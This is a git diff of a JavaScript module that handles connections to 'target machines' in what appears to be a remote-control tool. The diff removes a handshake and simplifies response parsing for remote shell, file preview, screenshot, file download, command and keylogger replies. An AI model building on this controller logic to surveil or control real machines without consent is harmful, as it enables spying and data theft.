@@ -3,7 +3,7 @@
  * @Description: 处理与靶机的连接
  * @Date: 2020-09-09 19:06:25
  * @LastEditors: MercyLin
- * @LastEditTime: 2020-09-11 14:19:48
+ * @LastEditTime: 2020-09-11 15:57:43
  * @FilePath: \seeds\src\main\Connect\index.js
  */
 
@@ -110,28 +110,10 @@ export function sendRequest (method, params = null, timeout = config.connection.
   })
 }
 
-/**
- * @description: 握手
- */
-export function handshake () {
-  target = getCurrentTarget().socket
-  var response = Buffer.alloc(8)
-  response.write('PONG')
-  target.write(response)
-}
-
 // function getStatus (statusCode) {
 //   return config.statusCodes[statusCode.toString()]
 // }
 
-/**
- * @description: 获取系统种类
- * @param {Number} systemKindCode 系统种类码
- * @return {String}
- */
-function getSystemKind (systemKindCode) {
-  return config.systemKind[systemKindCode]
-}
 
 /**
  * @description: 解析回复
@@ -139,119 +121,108 @@ function getSystemKind (systemKindCode) {
  * @param {Target} target 靶机
  */
 export function processData (data, target) {
-  if (data.slice(0, 4).toString() === 'PING') {
-    console.log('shake')
-    let tmp = getCurrentTarget()
-    try {
-      tmp.system = getSystemKind(data.slice(8, 12).readInt32LE())
-    } catch(err) {
-      console.log(err)
-    }
-    handshake()
-  } else {
-    var packetID = data.slice(0, 4).readInt32LE()
-    var statusCode = data.slice(4, 8).readInt32LE()
-    var totalLength = data.slice(8, 12).readInt32LE()
-    var content = data.slice(12, totalLength)
+  var packetID = data.slice(0, 4).readInt32LE()
+  var statusCode = data.slice(4, 8).readInt32LE()
+  var totalLength = data.slice(8, 12).readInt32LE()
+  var content = data.slice(12, totalLength)
 
-    const cb = callback.get(packetID)
+  const cb = callback.get(packetID)
 
-    if (typeof cb !== 'undefined') {
-      callback.del(packetID) // Delete callback when succeeded
-      console.log(`Received packet ${packetID} response`)
-      switch (statusCode) {
-        case 201:
-          shellConnect(target, true)
-          // console.log(getCurrentTarget().isShellConnected)
-          cb(getCurrentTarget().isShellConnected)
-          break
-        case 202:
-          let index = {
-            'filepreview': target.filepreviewQueue.indexOf(packetID),
-            'screenShot': target.screenShotQueue.indexOf(packetID),
-            'file': target.fileQueue.indexOf(packetID),
-            'command': target.commandQueue.indexOf(packetID)
-          }
-          for (var key in index) {
-            if (index[key] !== -1) {
-              switch (key) {
-                case 'filepreview':
-                  target.filepreviewQueue.shift()
-                  if (index[key] === 0) {
-                    cb(content.toString())
-                    // console.log(clientList[0].filepreviewQueue)
-                  } else {
-                    console.log('packet lost')
-                  }
-                  break
-                case 'screenShot':
-                  target.screenShotQueue.shift()
-                  if (index[key] === 0) {
-                    cb(content)
-                    // console.log(clientList[0].filepreviewQueue)
-                  } else {
-                    console.log('packet lost')
-                  }
-                  break
-                case 'file':
-                  target.fileQueue.shift()
-                  if (index[key] === 0) {
-                    cb(content)
-                    // console.log(clientList[0].filepreviewQueue)
-                  } else {
-                    console.log('packet lost')
-                  }
-                  break
-                case 'command':
-                  target.commandQueue.shift()
-                  if (index[key] === 0) {
-                    cb(content.toString())
-                    // console.log(clientList[0].filepreviewQueue)
-                  } else {
-                    console.log('packet lost')
-                  }
-                  break
-              }
-              break
+  if (typeof cb !== 'undefined') {
+    callback.del(packetID) // Delete callback when succeeded
+    console.log(`Received packet ${packetID} response`)
+    switch (statusCode) {
+      case 201:
+        shellConnect(target, true)
+        // console.log(getCurrentTarget().isShellConnected)
+        cb(getCurrentTarget().isShellConnected)
+        break
+      case 202:
+        let index = {
+          'filepreview': target.filepreviewQueue.indexOf(packetID),
+          'screenShot': target.screenShotQueue.indexOf(packetID),
+          'file': target.fileQueue.indexOf(packetID),
+          'command': target.commandQueue.indexOf(packetID)
+        }
+        for (var key in index) {
+          if (index[key] !== -1) {
+            switch (key) {
+              case 'filepreview':
+                target.filepreviewQueue.shift()
+                if (index[key] === 0) {
+                  cb(content.toString())
+                  // console.log(clientList[0].filepreviewQueue)
+                } else {
+                  console.log('packet lost')
+                }
+                break
+              case 'screenShot':
+                target.screenShotQueue.shift()
+                if (index[key] === 0) {
+                  cb(content)
+                  // console.log(clientList[0].filepreviewQueue)
+                } else {
+                  console.log('packet lost')
+                }
+                break
+              case 'file':
+                target.fileQueue.shift()
+                if (index[key] === 0) {
+                  cb(content)
+                  // console.log(clientList[0].filepreviewQueue)
+                } else {
+                  console.log('packet lost')
+                }
+                break
+              case 'command':
+                target.commandQueue.shift()
+                if (index[key] === 0) {
+                  cb(content.toString())
+                  // console.log(clientList[0].filepreviewQueue)
+                } else {
+                  console.log('packet lost')
+                }
+                break
             }
+            break
           }
-          break
-        case 203:
-          // updateKeyLogger(content)
-          cb(content.toString())
-          break
-        case 204:
-          // stopKeyLogger(content)
-          let ks = 'keylsogger stop'
-          cb(ks)
-          break
-        case 300:
-          // fileNotFound()
-          let fn = 'fileNotFound'
-          cb(fn)
-          break
-        case 401:
-          disconnectTarget(target)
-          // console.log("dis")
-          let dis = 'disconnectTarget'
-          cb(dis)
-          break
-        case 402:
-          shellConnect(target, false)
-          // console.log(getCurrentTarget().isShellConnected)
-          cb(getCurrentTarget().isShellConnected)
-          break
-        default:
-          let wc = 'wrong status code'
-          cb(wc)
-      }
-    } else {
-      /* If there's no recorded callback, it is timeout or fake */
-      console.log(`Received invalid packet ${packetID}`)
+        }
+        break
+      case 203:
+        // updateKeyLogger(content)
+        cb(content.toString())
+        break
+      case 204:
+        // stopKeyLogger(content)
+        let ks = 'keylsogger stop'
+        cb(ks)
+        break
+      case 300:
+        // fileNotFound()
+        let fn = 'fileNotFound'
+        cb(fn)
+        break
+      case 401:
+        disconnectTarget(target)
+        // console.log("dis")
+        let dis = 'disconnectTarget'
+        cb(dis)
+        break
+      case 402:
+        shellConnect(target, false)
+        // console.log(getCurrentTarget().isShellConnected)
+        cb(getCurrentTarget().isShellConnected)
+        break
+      default:
+        let wc = 'wrong status code'
+        cb(wc)
     }
-    console.log(packetID)
-    // console.log(getStatus(statusCode))
-    console.log(totalLength)
-    console.log(content)
+  } else {
+    /* If there's no recorded callback, it is timeout or fake */
+    console.log(`Received invalid packet ${packetID}`)
   }
+  console.log(packetID)
+  // console.log(getStatus(statusCode))
+  console.log(totalLength)
+  console.log(content)
 }
